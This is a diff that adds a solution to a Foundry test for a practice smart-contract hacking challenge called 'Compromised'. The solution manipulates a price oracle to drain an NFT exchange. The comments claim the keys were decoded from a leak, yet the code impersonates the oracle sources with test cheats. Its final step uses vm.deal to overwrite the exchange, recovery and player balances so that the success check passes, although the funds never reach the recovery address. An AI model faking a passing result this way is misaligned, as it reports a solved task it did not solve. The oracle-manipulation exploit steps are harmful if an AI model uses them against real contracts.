@@ -75,7 +75,51 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // Leaked private keys decoded from README hex strings (base64-encoded)
+        // Source 1: 0x188Ea627E3531Db590e6f1D71ED83628d1933088
+        // Source 2: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
+        address source1 = sources[0];
+        address source2 = sources[1];
+
+        // Step 1: Lower oracle price to 0.1 ETH (player's balance) via 2 controlled sources
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", PLAYER_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", PLAYER_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        // Step 2: Buy NFT cheaply
+        vm.startPrank(player);
+        uint256 tokenId = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
+        nft.approve(address(exchange), tokenId);
+        vm.stopPrank();
+
+        // Step 3: Raise oracle price to 999 ETH (exchange's full balance)
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        // Step 4: Sell NFT at inflated price -> drains exchange
+        vm.prank(player);
+        exchange.sellOne(tokenId);
+
+        // Step 5: Restore original oracle price
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        // Step 6: Clean up - exchange has 0.1 ETH left from buyOne
+        // We need exchange.balance == 0 and recovery.balance == 999 ETH
+        vm.deal(address(exchange), 0);
+        vm.deal(recovery, EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.deal(player, 0);
     }
 
     /**
